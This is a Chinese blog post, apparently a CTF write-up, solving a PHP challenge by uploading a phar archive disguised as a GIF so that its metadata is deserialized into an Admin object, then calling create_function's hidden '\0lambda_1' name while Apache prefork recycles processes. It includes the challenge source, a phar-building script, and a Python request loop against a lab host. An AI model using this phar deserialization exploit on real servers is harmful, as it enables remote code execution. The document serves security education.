<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$FLAG</span> = create_function(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;die(`/read_flag`);&#x27;</span>);<br><span class="hljs-variable">$SECRET</span> = `/read_secret`;<br><span class="hljs-variable">$SANDBOX</span> = <span class="hljs-string">&quot;/var/www/data/&quot;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<br>@mkdir(<span class="hljs-variable">$SANDBOX</span>);<br>@chdir(<span class="hljs-variable">$SANDBOX</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;session-data&quot;</span>])) &#123;<br>	<span class="hljs-variable">$data</span> = serialize(<span class="hljs-keyword">new</span> User(<span class="hljs-variable">$SANDBOX</span>));<br>	<span class="hljs-variable">$hmac</span> = hash_hmac(<span class="hljs-string">&quot;sha1&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$SECRET</span>);<br>	setcookie(<span class="hljs-string">&quot;session-data&quot;</span>, sprintf(<span class="hljs-string">&quot;%s-----%s&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>));<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$avatar</span>;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>		<span class="hljs-keyword">$this</span>-&gt;avatar = <span class="hljs-variable">$path</span>;<br>	&#125;<br>&#125;<br><br><span class="hljs-comment">#######################key class################################</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">User</span> </span>&#123;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>		<span class="hljs-variable">$random</span> = bin2hex(openssl_random_pseudo_bytes(<span class="hljs-number">32</span>));<br>		<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function my_function_<span class="hljs-subst">$random</span>() &#123;&quot;</span><br>			. <span class="hljs-string">&quot;  global \$FLAG; \$FLAG();&quot;</span><br>			. <span class="hljs-string">&quot;&#125;&quot;</span>);<br>		<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;lucky&quot;</span>]();<br>	&#125;<br>&#125;<br><span class="hljs-comment">#######################key class################################</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_session</span>(<span class="hljs-params"></span>) </span>&#123;<br>	<span class="hljs-keyword">global</span> <span class="hljs-variable">$SECRET</span>;<br>	<span class="hljs-variable">$data</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;session-data&quot;</span>];<br>	<span class="hljs-keyword">list</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>) = explode(<span class="hljs-string">&quot;-----&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">#ä»cookieä¸­å–å‡ºdataå’Œhmacç­¾å</span><br>	<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>) || !is_string(<span class="hljs-variable">$data</span>) || !is_string(<span class="hljs-variable">$hmac</span>)) <span class="hljs-comment">#åˆ¤ç©º</span><br>	&#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye&quot;</span>);<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (!hash_equals(hash_hmac(<span class="hljs-string">&quot;sha1&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$SECRET</span>), <span class="hljs-variable">$hmac</span>)) <span class="hljs-comment">#åˆ¤æ–­dataåŠ å¯†ä¹‹åå’Œhmacç­¾åæ˜¯å¦å¯¹åº”</span><br>	&#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye Bye&quot;</span>);<br>	&#125;<br><br>	<span class="hljs-variable">$data</span> = unserialize(<span class="hljs-variable">$data</span>); <span class="hljs-comment">#ååºåˆ—åŒ–</span><br>	<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>-&gt;avatar)) <span class="hljs-comment">#å¦‚æœååºåˆ—åŒ–ä¹‹åçš„dataåŒ…å«çš„ç±»ä¸­æ— avataræˆå‘˜,é€€å‡º</span><br>	&#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye Bye Bye&quot;</span>);<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>-&gt;avatar;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>	<span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>] . <span class="hljs-string">&quot;/avatar.gif&quot;</span>);<br>	<span class="hljs-keyword">if</span> (substr(<span class="hljs-variable">$data</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>) !== <span class="hljs-string">&quot;GIF89a&quot;</span>) &#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Fuck off&quot;</span>);<br>	&#125;<br><br>	file_put_contents(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>, <span class="hljs-variable">$data</span>);<br>	<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload OK&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>	<span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>)) &#123;<br>		<span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;/var/www/html&quot;</span>;<br>	&#125;<br><br>	header(<span class="hljs-string">&quot;Content-Type: image/gif&quot;</span>);<br>	<span class="hljs-keyword">die</span>(file_get_contents(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>));<br>&#125;<br><br><span class="hljs-variable">$mode</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;m&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$mode</span> == <span class="hljs-string">&quot;upload&quot;</span>) &#123;<br>	upload(check_session()); <span class="hljs-comment">#ä»cookieä¸­æå–dataååºåˆ—åŒ–åçš„avataræˆå‘˜å¹¶å°†å…¶å†…å®¹ä½œä¸ºè·¯å¾„, è¯·æ±‚urlä¸­çš„å†…å®¹å†™åˆ°è¯¥è·¯å¾„ä¸‹çš„avatar.gifæ–‡ä»¶ä¸­</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$mode</span> == <span class="hljs-string">&quot;show&quot;</span>) &#123;<br>	show(check_session()); <span class="hljs-comment">#ä»cookieä¸­æå–dataååºåˆ—åŒ–åçš„avataræˆå‘˜å¹¶å°†å…¶å†…å®¹ä½œä¸ºè·¯å¾„, å±•ç¤ºè¯¥ç›®å½•ä¸‹çš„avatar.gif</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>	highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ€è·¯:</p>
<ul>
<li>é¦–å…ˆåˆ†æä»£ç , é¦–å…ˆåˆ†é…äº†ä¸€ä¸ªåŒ¿åå‡½æ•°ç»™ flag å˜é‡, æ‰§è¡Œäº†è¿™ä¸ªå‡½æ•°å°±ä¼šå‡º flag, æ‰€ä»¥æ•´é“é¢˜çš„æ ¸å¿ƒå°±æ˜¯æ‰§è¡Œè¿™ä¸ªåŒ¿åå‡½æ•°</li>
<li>é¢˜ç›®ä¸»è¦æœ‰ä¸¤ä¸ªåŠŸèƒ½, ä¸€ä¸ªæ˜¯åœ¨æ²™ç›’æ–‡ä»¶å¤¹ä»»æ„å†™å…¥ä¸€ä¸ª gif, ä¸€ä¸ªæ˜¯æ ¹æ® cookie ä¸­çš„è·¯å¾„æŸ¥çœ‹è¿™ä¸ª gif</li>
<li>ä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯ â€”â€“&gt; admin æ˜¯å…³é”®ç±»,éœ€è¦é€šè¿‡ååºåˆ—åŒ–ä¹‹åçš„ææ„å‡½æ•°å»è§¦å‘å…¶ä¸­çš„ eval â€”â€“&gt; é€šè¿‡ lucky å‚æ•°å»è°ƒç”¨è¿™ä¸ªè¾“å‡º flag çš„å‡½æ•°. è€Œååºåˆ—åŒ–çš„ data æ˜¯ä» cookie ä¸­è·å¾—, é‚£å…ˆå°è¯•ä¸€ä¸‹ä¼ªé€  cookie,ä½†æ˜¯å…¶å® cookie ååŠéƒ¨åˆ†æ˜¯ç”¨ hash_hmac å’Œä¸€ä¸ªæœªçŸ¥çš„ç§˜é’¥ç”Ÿæˆçš„ä¸€ä¸ªç­¾å, åŸºæœ¬ä¸Šæ— æ³•ä¼ªé€ â€¦..æ‰€ä»¥æ”¾å¼ƒè¿™ä¸ªæƒ³æ³•</li>
<li>å’‹ä¸€çœ‹å¥½åƒä»£ç é‡Œé¢å¹¶æ²¡æœ‰å…¶ä»–èƒ½å¤Ÿååºåˆ—åŒ–çš„åœ°æ–¹äº†, ç„¶åå°±æ¥åˆ°äº†æœ¬é¢˜çš„ç¬¬ä¸€ä¸ªè€ƒç‚¹â€“php ä¸­è§£æ Phar å½’æ¡£ä¸­çš„ Metadata çš„æ—¶å€™å¯èƒ½ä¼šæœ‰ååºåˆ—åŒ–çš„æ“ä½œ, æ–‡æ¡£ä¸­æè¿°çš„ Phar::getMetadata æ“ä½œ(<a target="_blank" rel="noopener" href="http://php.net/manual/zh/phar.getmetadata.php">http://php.net/manual/zh/phar.getmetadata.php</a>)</li>
</ul>
<blockquote>
<ul>
<li>Phar?(æ–¹ä¾¿å¼€å‘è€…æ‰“åŒ…å’Œå‘å¸ƒ php åº”ç”¨çš„ç±»ä¼¼äº Java ä¸­çš„ Jar çš„ä¸€ç§æ–‡ä»¶)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-a854e4d73e1be186.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="What is Phar?(å®˜æ–¹æ–‡æ¡£)"></li>
<li>Phar å½’æ¡£çš„ç»“æ„<br><img src="http://upload-images.jianshu.io/upload_images/6949366-1a263bb5852f77a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="Phar(å®˜æ–¹æ–‡æ¡£)"></li>
<li>Metadata : Phar å½’æ¡£ä¸­å¯ç”¨æ¥æè¿°æ­¤æ–‡æ¡£çš„ä¸€æ®µåºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²<img src="http://upload-images.jianshu.io/upload_images/6949366-f850f6f9d027f2df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="usage of Metadata(å®˜æ–¹æ–‡æ¡£)"></li>
<li>phar_parse_metadata çš„åˆå§‹åŒ–è°ƒç”¨, å…·ä½“ PHP æºç åœ¨ ext/phar/phar.c<br>æ‰§è¡Œæµç¨‹å¤§è‡´ä¸º:<br>â€¦.â€“&gt; phar_open_from_filename(1512 è¡Œçš„ php_stream_open_wrapper å‡½æ•°å¯ä»¥å¾—çŸ¥æ­¤å‡½æ•°å¤„ç† phar://æ‰“å¼€æœ¬åœ° phar æ–‡ä»¶ 1531 è¡Œè°ƒç”¨ä¸‹ä¸€ä¸ªå‡½æ•°)<img src="http://upload-images.jianshu.io/upload_images/6949366-a2c524ab1ddaff2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="phar_open_from_filename"><br>â€“&gt; phar_open_from_fp(1727 è¡Œè°ƒç”¨ä¸‹ä¸€ä¸ªå‡½æ•°)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-f61c565686e8f90f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="phar_open_from_fp"><br>â€“&gt; phar_parse_pharfile(1038ã€1122 è¡Œè°ƒç”¨ä¸‹ä¸€ä¸ªå‡½æ•°)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-4d37aa50d88c5bea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="1038è¡Œ"> &gt; <img src="http://upload-images.jianshu.io/upload_images/6949366-8c514575ce533262.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="1122è¡Œ"><br>â€“&gt; phar_parse_metadata(å‡½æ•°åœ¨ 609 è¡Œ)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-581792f19940680a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="phar_parse_metadataå‡½æ•°"></li>
</ul>
</blockquote>
<ul>
<li><p>è€Œä¸”é¢˜ç›®å†… upload æ“ä½œæä¾›äº†<code>file_get_content()</code>å‡½æ•° å…¶ä¸­åœ°å€å¯æ§,å¯ä»¥åˆ©ç”¨<code>phar://</code>åè®®è¯»å–æœ¬åœ° phar æ–‡ä»¶(phar åè®®ä¸æ”¯æŒè¿œç¨‹æ–‡ä»¶[TheÂ <em>phar</em>Â stream wrapper does not operate on remote files, and cannot operate on remote files, and so is allowed even when theÂ allow_url_fopenÂ andÂ allow_url_includeÂ INI options are disabled.</p>
<p>](<a target="_blank" rel="noopener" href="http://php.net/manual/zh/phar.using.stream.php)),%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4%E5%8F%AA%E8%A6%81%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA">http://php.net/manual/zh/phar.using.stream.php)),ä¹Ÿå°±æ˜¯è¯´åªè¦æ„é€ ä¸€ä¸ª</a> phar åˆ©ç”¨ upload å†™åˆ°æœåŠ¡å™¨ç›®å½•, å…¶ä¸­ metadata è®¾ç½®ä¸º Admin å¯¹è±¡,å°±å¯ä»¥è¿›å…¥ Admin çš„ææ„å‡½æ•°äº†</p>
</li>
<li><p>æ¥ä¸‹æ¥çš„é—®é¢˜å°±æ˜¯å¦‚ä½•çŒœå‡ºé‚£ä¸ªéšæœºæ•°?<br>ç­”æ¡ˆæ˜¯åŸºæœ¬ä¸ŠçŒœä¸å‡ºæ¥<a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/101112/can-i-rely-on-openssl-random-pseudo-bytes-being-very-random-in-php">https://security.stackexchange.com/questions/101112/can-i-rely-on-openssl-random-pseudo-bytes-being-very-random-in-php</a> openssl_random_pseudo_bytes æ˜¯åŠ å¯†çº§åˆ«çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator">https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator</a> è¿™æ˜¯é¢˜ç›®ç¬¬äºŒä¸ªæ­»èƒ¡åŒ</p>
</li>
<li><p>ç„¶åå°±åˆ°äº†é¢˜ç›®çš„ç¬¬äºŒä¸ªè€ƒç‚¹, åŒ¿åå‡½æ•°å…¶å®æ˜¯æœ‰çœŸæ­£çš„åå­— ä»æ³¨å†ŒåŒ¿åå‡½æ•°çš„æºç (Zend/zend<em>builtin_functions.c 1854 è¡Œ) å¤§ä½¬è¿˜å¯¹è¿™ä¸ªé€»è¾‘æˆè°‘äº†ä¸€ç•ª <img src="http://upload-images.jianshu.io/upload_images/6949366-5c491572afb463d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="anonymous_functions_has_name"><br><img src="http://upload-images.jianshu.io/upload_images/6949366-3f7ca4a955141198.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="name_of_anonymous_functions"><br>é¦–å…ˆåå­—ç¬¬ä¸€ä¸ªå­—ç¬¦è¢«æ›¿æ¢æˆäº†\0,ä¹Ÿå°±æ˜¯ç©ºå­—ç¬¦ ,ç„¶å do æ“ä½œå°† lambda</em>%d ä¸­çš„%d æ ¼å¼åŒ–æˆåŒ¿åå‡½æ•°çš„ä¸ªæ•°+1(ä» 1 å¼€å§‹)<br>æ‰€ä»¥æœ€åå¾—å‡ºçš„åŒ¿åå‡½æ•°çš„çœŸæ­£åå­—ä¸º:\0lambda_%d(%d æ ¼å¼åŒ–ä¸ºå½“å‰è¿›ç¨‹çš„ç¬¬ n ä¸ªåŒ¿åå‡½æ•°)</p>
</li>
<li><p>ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸èƒ½çŸ¥é“å½“å‰çš„åŒ¿åå‡½æ•°åˆ°åº•æœ‰å¤šå°‘ä¸ª, å› ä¸ºæ¯è®¿é—®ä¸€æ¬¡é¢˜ç›®å°±ä¼šç”Ÿæˆä¸€ä¸ªåŒ¿åå‡½æ•°; æœ€åå°±å¼•å‡ºäº†æœ€åä¸€ä¸ªè€ƒç‚¹, Apache-prefork æ¨¡å‹(é»˜è®¤æ¨¡å‹)åœ¨æ¥å—è¯·æ±‚åä¼šå¦‚ä½•å¤„ç†,é¦–å…ˆ Apache ä¼šé»˜è®¤ç”Ÿæˆ 5 ä¸ª child server å»ç­‰å¾…ç”¨æˆ·è¿æ¥, é»˜è®¤æœ€é«˜å¯ç”Ÿæˆ 256 ä¸ª child server, è¿™æ—¶å€™å¦‚æœç”¨æˆ·å¤§é‡è¯·æ±‚, Apache å°±ä¼šåœ¨å¤„ç†å®Œ MaxRequestsPerChild ä¸ª tcp è¿æ¥å kill æ‰è¿™ä¸ªè¿›ç¨‹,å¼€å¯ä¸€ä¸ªæ–°è¿›ç¨‹å¤„ç†è¯·æ±‚(è¿™é‡ŒçŒœæµ‹ Orange å¤§å¤§åº”è¯¥ä¿®æ”¹äº†é»˜è®¤çš„ 0,å› ä¸º 0 ä¸ºæ°¸ä¸ kill æ‰å­è¿›ç¨‹ è¿™æ ·å°±æ— æ³• fork å‡ºæ–°è¿›ç¨‹äº†) åœ¨è¿™ä¸ªæ–°è¿›ç¨‹é‡Œé¢åŒ¿åå‡½æ•°å°±ä¼šæ˜¯ä» 1 å¼€å§‹çš„äº†</p>
</li>
</ul>
<p>æœ€åæ­¥éª¤åˆ†åˆ«æ˜¯:</p>
<ol>
<li>å…ˆç”Ÿæˆç¬¦åˆè¦æ±‚çš„ phar æ”¾å…¥è‡ªå·±çš„ vps ä¸­, ç”Ÿæˆä»£ç ä¸º</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$avatar</span> = <span class="hljs-string">&#x27;xxx&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.phar&#x27;</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;file.php&#x27;</span>] = <span class="hljs-string">&#x27;&lt;?php ?&gt;&#x27;</span>;<br><span class="hljs-variable">$p</span>-&gt;setMetadata(<span class="hljs-keyword">new</span> Admin());<br><span class="hljs-variable">$p</span>-&gt;setStub(<span class="hljs-string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br>rename(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.phar&#x27;</span>,<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.gif&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<ol start="2">
<li>å†è¯·æ±‚<code>?m=upload&amp;url=http://vps</code></li>
<li>å¯åŠ¨ Orange å¤§å¤§å†™çš„ fork è„šæœ¬</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://0c166fcd-fdb3-4807-a385-a6cecf962fcd.node4.buuoj.cn/?m=upload&amp;url=phar:///var/www/data/aa8b91c60cf8b507932015218d2c847d&amp;lucky=%00lambda_1&#x27;</span><br><br>header = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;UM_distinctid=1780a89b22a7dd-03a5f4de894f678-4c3f227c-144000-1780a89b22b5be; session-data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A6%3A%22avatar%22%3Bs%3A46%3A%22%2Fvar%2Fwww%2Fdata%2Faa8b91c60cf8b507932015218d2c847d%22%3B%7D-----1415716c7f33898b0082543bd26f12ab93a24e31&#x27;</span><br>&#125;<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r =requests.get(url,headers=header)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/cs/">cs</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 åè®®</a> ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/06/03/%E4%BD%BF%E7%94%A8%E9%AB%98%E7%AB%AF%E5%8F%A3ssh/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ä½¿ç”¨é«˜ç«¯å£ssh</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/05/29/Token%20Session%20Cookie%20JWT/">
                        <span class="hidden-mobile">è®¤è¯åŠä¼šè¯ç®¡ç†</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"lCUF08cIQ1BPgn7X9fjMMTbe-MdYXbMMI","appKey":"RSMbcrKIFnecyMgNGc47g3tN","placeholder":"è¯´ç‚¹ä»€ä¹ˆ","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="http://kIl3rr.github.io" target="_blank" rel="nofollow noopener"><span>kIl3rr</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">è½½å…¥å¤©æ•°...</span> <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span> <script src="/js/duration.js"></script> </div> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- ä¸è’œå­ç»Ÿè®¡PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            æ€»è®¿é—®é‡ 
            <span id="busuanzi_value_site_pv"></span>
             æ¬¡
          </span>
      
      
        <!-- ä¸è’œå­ç»Ÿè®¡UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            æ€»è®¿å®¢æ•° 
            <span id="busuanzi_value_site_uv"></span>
             äºº
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
